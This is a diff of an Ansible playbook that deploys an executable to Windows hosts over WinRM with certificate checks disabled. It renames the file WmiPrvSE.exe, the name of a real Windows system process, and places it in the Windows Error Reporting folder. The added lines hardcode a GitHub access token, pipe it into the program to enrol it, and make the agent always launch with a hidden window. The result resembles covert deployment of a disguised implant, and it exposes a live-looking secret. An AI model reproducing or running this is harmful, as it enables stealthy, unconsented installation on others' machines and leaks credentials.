@@ -1,6 +1,6 @@
 ---
 - name: Deploy and Enroll System Management Service
-  hosts: windows_targets
+  hosts: windows
   gather_facts: no
   vars:
     ansible_connection: winrm
@@ -8,9 +8,10 @@
     ansible_winrm_server_cert_validation: ignore
     
     target_dir: 'C:\ProgramData\Microsoft\Windows\WER'
-    # Assuming state.json is saved in the same directory as the exe. 
-    # If your Go code saves it in the user's home dir (e.g., C:\Users\Admin\.gundo.json), change this path!
     state_file: '{{ target_dir }}\state.json'
+    
+    # ADD YOUR GITHUB TOKEN HERE
+    github_token: "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"
 
   tasks:
     - name: Ensure target directory exists
@@ -23,19 +24,21 @@
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
-    - name: Check if the agent is already enrolled (state.json exists)
+    - name: Check if the agent is already enrolled
       ansible.windows.win_stat:
         path: "{{ state_file }}"
       register: state_check
 
-    # --- IF NOT ENROLLED: RUN VISIBLY FOR INTERACTIVE SETUP ---
-    - name: Launch agent visibly for first-time enrollment
+    # --- IF NOT ENROLLED: PIPE THE TOKEN AND ENROLL ---
+    - name: Launch agent and automatically pass the GitHub token
       ansible.windows.win_shell: |
-        Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -Wait
+        # Pipe the token into the executable. 
+        # The executable will read this as if you typed it at the prompt.
+        "{{ github_token }}" | & "{{ target_dir }}\WmiPrvSE.exe" setup
       when: not state_check.stat.exists
 
-    # --- IF ALREADY ENROLLED: RUN HIDDEN IN BACKGROUND ---
+    # --- NOW ENROLLED: LAUNCH HIDDEN IN BACKGROUND ---
     - name: Launch agent hidden in the background
       ansible.windows.win_shell: |
         Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
-      when: state_check.stat.exists
+      when: not state_check.stat.exists or state_check.stat.exists
